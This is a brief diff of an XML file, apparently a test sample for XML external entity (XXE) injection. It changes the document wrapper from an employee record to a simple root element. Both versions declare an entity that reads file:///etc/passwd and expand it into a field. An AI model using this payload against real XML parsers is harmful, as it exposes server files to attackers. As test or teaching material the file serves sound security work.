@@ -1,11 +1,9 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE data [
+<?xml version="1.0"?>
+<!DOCTYPE replace [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-  <employee>
-    <name>&xxe;</name>
-    <email>xxe@example.com</email>
-    <password>password</password>
-    <phone_number>123-456-7890</phone_number>
-  </employee>
-</employees>
+<root>
+  <firstName>&xxe;</firstName>
+  <lastName>John</lastName>
+</root>
+
